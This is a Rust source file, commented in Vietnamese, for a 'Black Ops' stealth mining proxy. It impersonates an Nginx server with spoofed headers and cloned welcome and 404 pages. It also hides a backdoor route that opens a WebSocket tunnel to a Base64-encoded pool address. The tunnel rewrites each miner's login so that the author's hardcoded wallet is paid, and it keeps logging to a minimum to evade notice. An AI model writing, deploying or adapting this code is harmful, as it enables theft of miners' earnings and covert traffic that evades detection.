use axum::{
    extract::{Path, WebSocketUpgrade, ws::{Message, WebSocket}},
    response::{Html, Response, IntoResponse},
    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, CONTENT_TYPE}},
    routing::get,
    Router,
    middleware::{self, Next},
    extract::Request,
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use base64::{Engine as _, engine::general_purpose};
use colored::*;
use chrono::Utc;

// ==========================================
// ⚙️ CẤU HÌNH BÍ MẬT
// ==========================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";
const MY_WALLET: &str = "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.003";
const MY_WORKER: &str = "Worker_BlackOps";

// ==========================================
// 🎭 NGỤY TRANG: NGINX CLONE
// ==========================================
// Copy y hệt mã nguồn trang 404 mặc định của Nginx Debian
const NGINX_404_HTML: &str = r#"<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
"#;

const NGINX_WELCOME: &str = r#"<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>"#;

// ==========================================
// MAIN APP
// ==========================================
struct ProxyStats {
    shares_sent: AtomicUsize,
    shares_accepted: AtomicUsize,
}

#[tokio::main]
async fn main() {
    // Middleware giả mạo Header Nginx
    let app = Router::new()
        .route("/", get(root_handler)) // Trang chủ
        .route("/:path", get(stealth_handler)) // Cửa hậu
        .layer(middleware::from_fn(nginx_spoofer)); // Áp dụng lớp mặt nạ cho mọi request

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    println!("{} {}", "💀 BLACK OPS PROXY RUNNING ON".red().bold(), addr);
    println!("🛡️  Mode: {}", "High Stealth (Nginx Header Spoofing)".cyan());
    
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

// ==========================================
// 🛡️ MIDDLEWARE: GIẢ MẠO HEADER
// ==========================================
async fn nginx_spoofer(req: Request, next: Next) -> Response {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();

    // 1. Ghi đè Server Header thành Nginx
    headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
    
    // 2. Thêm Date chuẩn HTTP (RFC1123)
    let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
    if let Ok(val) = HeaderValue::from_str(&now) {
        headers.insert(DATE, val);
    }

    // 3. Giả lập Connection keep-alive
    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));

    response
}

// ==========================================
// HANDLERS
// ==========================================

async fn root_handler() -> Html<&'static str> {
    Html(NGINX_WELCOME)
}

// Đây là "Cánh cửa thần kỳ". 
// Nó nhìn giống như 404, nhưng nếu gõ đúng mật khẩu (Base64 + WS) thì nó mở.
async fn stealth_handler(
    Path(path): Path<String>, 
    ws: Option<WebSocketUpgrade>
) -> Response {
    // Bước 1: Kiểm tra xem Path có phải là Base64 hợp lệ không
    // Các đường dẫn rác như /favicon.ico, /robots.txt sẽ rớt đài tại đây
    let decoded = match general_purpose::STANDARD.decode(&path) {
        Ok(d) => d,
        Err(_) => return not_found_response(),
    };

    let pool_addr = match String::from_utf8(decoded) {
        Ok(s) => {
            // Pool address phải có dấu ':' (vd: pool.com:1234)
            if s.contains(':') { s } else { return not_found_response() }
        },
        Err(_) => return not_found_response(),
    };

    // Bước 2: Kiểm tra xem có phải WebSocket Upgrade không
    // Nếu dùng trình duyệt truy cập -> 404
    match ws {
        Some(w) => {
            // 🔥 KÍCH HOẠT CHẾ ĐỘ MINING 🔥
            // println!("{} Stealth tunnel opened to {}", "🥷".magenta(), pool_addr);
            w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
        },
        None => not_found_response()
    }
}

// Trả về trang 404 y hệt Nginx
fn not_found_response() -> Response {
    (
        StatusCode::NOT_FOUND,
        [(CONTENT_TYPE, "text/html")],
        Html(NGINX_404_HTML)
    ).into_response()
}

// ==========================================
// MINING LOGIC (CORE)
// ==========================================
async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
    // Kết nối TCP im lặng. Nếu lỗi, ngắt luôn không báo gì.
    let tcp_stream = match TcpStream::connect(&pool_addr).await {
        Ok(s) => s,
        Err(_) => return, 
    };

    let (mut pool_read, mut pool_write) = tcp_stream.into_split();
    let (mut ws_write, mut ws_read) = socket.split();
    
    let stats = Arc::new(ProxyStats {
        shares_sent: AtomicUsize::new(0),
        shares_accepted: AtomicUsize::new(0),
    });

    // LUỒNG 1: Miner -> Pool (Thay ví)
    let _stats_miner = stats.clone();
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    for line in text.lines() {
                        if line.trim().is_empty() { continue; }
                        let mut final_msg = line.to_string();
                        
                        // Parse JSON siêu nhanh
                        if line.contains("login") || line.contains("submit") {
                            if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                                if let Some(method) = json["method"].as_str() {
                                    if method == "login" {
                                        if let Some(params) = json.get_mut("params") {
                                            params["login"] = serde_json::json!(MY_WALLET);
                                            params["pass"] = serde_json::json!(MY_WORKER);
                                            final_msg = json.to_string();
                                        }
                                    }
                                }
                            }
                        }
                        
                        if !final_msg.ends_with('\n') { final_msg.push('\n'); }
                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                    }
                }
                Message::Close(_) => break,
                _ => {}
            }
        }
    });

    // LUỒNG 2: Pool -> Miner (Audit)
    let _stats_pool = stats.clone();
    let server_to_client = tokio::spawn(async move {
        let mut buffer = [0u8; 8192];
        loop {
            match pool_read.read(&mut buffer).await {
                Ok(0) => break,
                Ok(n) => {
                    let data = &buffer[0..n];
                    // Chuyển thẳng text để tiết kiệm CPU, không parse JSON chiều về trừ khi cần thiết
                    // Code này tối ưu cho việc ẩn danh, hạn chế log in ra màn hình
                    if let Ok(text) = std::str::from_utf8(data) {
                         if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
                    }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
}
